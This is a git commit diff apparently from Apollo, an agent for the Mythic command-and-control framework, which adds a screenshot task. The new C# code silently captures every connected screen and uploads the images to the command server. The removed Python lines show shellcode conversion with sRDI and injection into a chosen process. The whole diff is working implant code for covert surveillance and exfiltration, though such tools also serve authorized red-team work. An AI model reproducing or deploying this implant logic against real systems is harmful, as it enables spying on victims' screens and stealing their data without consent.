0ae3bcfa8a1e0f41bd2f0311eec8c22b8604e4fc
Dwight Hohnstein <djhohnstein@gmail.com>
2021-10-25 09:35:27 -0700

    inline screenshot first pass

---
+++ Payload_Type/apollo/agent_code/Tasks/screenshot.cs
@@ -0,0 +1,82 @@
+﻿using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using ST = System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Drawing;
+using System.IO;
+
+namespace Tasks
+{
+    public class screenshot : Tasking
+    {
+        public screenshot(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
+        {
+        }
+
+        public override void Kill()
+        {
+            base.Kill();
+        }
+
+        public override ST.Task CreateTasking()
+        {
+            return new ST.Task(() =>
+            {
+                TaskResponse resp = CreateTaskResponse("", true);
+                List<byte[]> captures = new List<byte[]>();
+                foreach(Screen sc in Screen.AllScreens)
+                {
+                    byte[] bScreen = GetBytesFromScreen(sc);
+                    captures.Add(bScreen);
+                }
+
+                foreach(byte[] bScreen in captures)
+                {
+                    if (!_agent.GetFileManager().PutFile(
+                        _cancellationToken.Token,
+                        _data.ID,
+                        bScreen,
+                        null,
+                        true))
+                    {
+                        resp = CreateTaskResponse("Failed to send screenshot to Mythic", true, "error");
+                        break;
+                    }
+                }
+                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                // Your code here..
+                // Then add response to queue
+                // _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+            }, _cancellationToken.Token);
+        }
+
+        private byte[] GetBytesFromScreen(Screen screen)
+        {
+            byte[] bScreen = null;
+            using (Bitmap bmpScreenCapture = new Bitmap(screen.Bounds.Width,
+                                            screen.Bounds.Height))
+            {
+                using (Graphics g = Graphics.FromImage(bmpScreenCapture))
+                {
+                    g.CopyFromScreen(screen.Bounds.X,
+                                        screen.Bounds.Y,
+                                        0, 0,
+                                        bmpScreenCapture.Size,
+                                        CopyPixelOperation.SourceCopy);
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        bmpScreenCapture.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
+                        bScreen = ms.ToArray();
+                    }
+                }
+            }
+
+            return bScreen;
+        }
+    }
+}
--- Payload_Type/apollo/mythic/agent_functions/screenshot.py
+++ Payload_Type/apollo/mythic/agent_functions/screenshot.py
@@ -11,30 +11,9 @@ class ScreenshotArguments(TaskArguments):
     def __init__(self, command_line):
         super().__init__(command_line)
         self.args = {
-            "pid": CommandParameter(name="PID", type=ParameterType.Number, description="Process ID to inject into."),
-            "arch": CommandParameter(name="Architecture", type=ParameterType.String, choices=["x86", "x64"], description="Architecture of the remote process."),}
+        }
 
     async def parse_arguments(self):
-        if not len(self.command_line):
-            raise Exception("Usage: {}".format(ScreenshotCommand.help_cmd))
-
-        if self.command_line[0] == "{":
-            self.load_args_from_json_string(self.command_line)
-        else:
-            parts = self.command_line.strip().split(" ", maxsplit=2)
-            valid_arch = ["x86", "x64"]
-            if len(parts) != 2:
-                raise Exception("Invalid command line arguments passed.\n\tUsage: {}".format(ScreenshotCommand.help_cmd))
-            try:
-                int(parts[0])
-            except:
-                raise Exception(f"Invalid PID passed to screenshot: {parts[0]}")
-            self.add_arg("pid", int(parts[0]), ParameterType.Number)
-            if parts[1] not in valid_arch:
-                arches = ", ".join(valid_arch)
-                raise Exception(f"Invalid architecture passed: {parts[1]}. Must be one of {arches}")
-            self.add_arg("arch", parts[1])
-        self.add_arg("pipe_name", str(uuid4()))
         pass
 
 
@@ -56,20 +35,6 @@ class ScreenshotCommand(CommandBase):
     attackmapping = ["T1113"]
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
-        arch = task.args.get_arg("arch")
-        dllFile = path.join(self.agent_code_path, f"Screenshot_{arch}.dll")
-        dllBytes = open(dllFile, 'rb').read()
-        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("InitializeNamedPipeServer"), task.args.get_arg("pipe_name").encode(), 0)
-        resp = await MythicRPC().execute("create_file",
-                                         task_id=task.id,
-                                         file=base64.b64encode(converted_dll).decode(),
-                                         delete_after_fetch=True)
-        if resp.status == MythicStatus.Success:
-            task.args.add_arg("loader_stub_id", resp.response['agent_file_id'])
-        else:
-            raise Exception(f"Failed to host sRDI loader stub: {resp.error}")
-        task.display_params = "{} {}".format(task.args.get_arg("pid"), arch)
-        task.args.remove_arg("arch")
         return task
 
     async def process_response(self, response: AgentResponse):
